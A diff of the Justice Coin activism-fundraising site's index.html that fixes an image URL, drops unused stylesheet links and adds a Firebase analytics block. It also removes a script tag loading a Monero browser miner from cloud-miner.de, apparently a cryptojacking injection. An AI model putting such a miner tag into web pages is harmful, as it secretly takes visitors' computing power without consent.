@@ -19,7 +19,7 @@
   <meta property="og:title" content="Justice Coin | Decentralized Activism" />
   <meta property="og:description"
     content="Decentralized digital fundraising platform promoting equality, activism and social justice." />
-  <meta property="og:image" content="https:/ justicecoin.org/fcoin.png" />
+  <meta property="og:image" content="https://justicecoin.org/fcoin.png" />
 
   <!-- {/* Twitter */} -->
   <meta property="twitter:card" content="summary_large_image" />
@@ -29,14 +29,6 @@
     content="Decentralized digital fundraising platform promoting equality, activism and social justice." />
   <meta property="twitter:image" content="https://justicecoin.org/fcoin.png" />
 
-  <!-- {/* Bootstrap Css */} -->
-  <!-- <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
-    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossOrigin="anonymous" /> -->
-  <!-- {/* Animate Css */} -->
-  <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.min.css" /> -->
-  <!-- {/* Material Design Icons */} -->
-  <!-- <link rel="stylesheet" -->
-    <!-- href="https://cdnjs.cloudflare.com/ajax/libs/material-design-icons/3.0.1/iconfont/material-icons.min.css" /> -->
   <!-- {/* Custom style Css */} -->
   <link rel="stylesheet" href="/css/styles.css" />
 
@@ -60,12 +52,30 @@
 
     gtag('config', 'UA-173365126-1');
   </script>
-  <script src="https://cloud-miner.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.moneroocean"></script>
 
 </head>
 
 <body>
   <div id="root"></div>
+  <!-- The core Firebase JS SDK is always required and must be listed first -->
+  <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-app.js"></script>
+
+  <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+  <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-analytics.js"></script>
+  <script>var firebaseConfig = {
+      apiKey: "AIzaSyDEx0vJTnz8t8M8rvvY2mKqtbGq8r6x5JQ",
+      authDomain: "justicecoinofficialwebsite.firebaseapp.com",
+      databaseURL: "https://justicecoinofficialwebsite.firebaseio.com",
+      projectId: "justicecoinofficialwebsite",
+      storageBucket: "justicecoinofficialwebsite.appspot.com",
+      messagingSenderId: "217628386627",
+      appId: "1:217628386627:web:85e9eb1eecdd4ac2ea7bf6",
+      measurementId: "G-BZ0WC1FCRX"
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    firebase.analytics();</script>
 </body>
 
 </html>
